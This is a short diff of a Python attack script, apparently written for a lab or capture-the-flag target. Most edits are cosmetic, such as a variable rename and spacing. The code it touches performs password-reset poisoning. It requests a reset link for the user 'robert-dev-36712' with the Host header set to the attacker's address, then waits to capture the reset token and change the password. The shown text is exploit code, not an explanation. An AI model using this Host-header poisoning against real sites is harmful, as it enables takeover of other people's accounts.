@@ -1,4 +1,4 @@
-#! /usr/bin/python3
+#!/usr/bin/python3
 
 ####
 ####
@@ -14,8 +14,8 @@ import time
 ###############
 ###############
 
-host = ""
-my_ip = ""
+host   = ""
+myaddy = ""
 
 ###############
 ###############
@@ -41,7 +41,7 @@ def change_password(token):
 
 def send_link():
     url = f"http://{host}/forgot?username=robert-dev-36712"
-    headers = {"Host": f"{my_ip}"}
+    headers = {"Host": f"{myaddy}"}
     res = requests.get(url, headers=headers)
     if "Password reset link has been sent to user inbox. Please use the link to reset your password" in res.text:
         print("Password link sent. Awaiting token...")
